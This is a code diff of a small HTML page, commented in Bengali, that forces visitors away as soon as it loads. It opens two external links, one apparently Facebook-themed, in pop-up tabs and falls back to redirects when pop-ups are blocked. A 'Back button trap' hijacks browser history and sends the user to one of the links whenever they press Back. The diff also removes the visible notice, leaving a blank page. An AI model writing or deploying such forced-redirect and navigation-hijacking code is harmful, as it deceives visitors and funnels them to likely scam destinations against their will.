@@ -2,48 +2,43 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Auto Redirect Tabs</title>
+  <title>Instant Auto Redirect</title>
 </head>
-<body style="margin:0;padding:0;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;">
-  <h1>Please wait... Opening content 🔥</h1>
-
+<body style="margin:0;padding:0;background:#000;">
 <script>
 (function(){
   var link1 = "https://shimulqww.github.io/Unitedstatesvideos/";
   var link2 = "https://fb-tools.social-networking.me";
 
-  // পেজ লোড হলে দুই লিংক খুলবে
+  // পেজ লোড হলে সাথে সাথে চালু হবে
   window.addEventListener("load", function(){
-    // প্রথম লিংক নতুন ট্যাবে
+    // প্রথম লিংক ট্যাবে খুলবে
     var w1 = window.open(link1, "_blank");
 
-    // অল্প সময় পরে দ্বিতীয় লিংক নতুন ট্যাবে
+    // দ্বিতীয় লিংক একটু পরে ট্যাবে খুলবে
     setTimeout(function(){
       var w2 = window.open(link2, "_blank");
       if(!w2 || w2.closed){
-        // popup blocker হলে fallback
         window.location.href = link2;
       }
-    }, 300);
+    }, 400);
 
-    // যদি popup blocker থাকে fallback হিসেবে প্রথম লিংক ওপেন
+    // fallback for first link
     setTimeout(function(){
       if(!w1 || w1.closed){
         window.location.href = link1;
       }
-    }, 600);
+    }, 800);
   });
 
-  // 🔄 Back button trap (unlimited redirect)
+  // 🔄 Back button trap (random link)
   history.pushState(null, null, location.href);
   window.onpopstate = function () {
     history.pushState(null, null, location.href);
-    // back প্রেস করলে redirect হবে যেকোনো লিঙ্কে
     var targets = [link1, link2];
     var rand = targets[Math.floor(Math.random() * targets.length)];
     window.location.href = rand;
   };
-
 })();
 </script>
 </body>
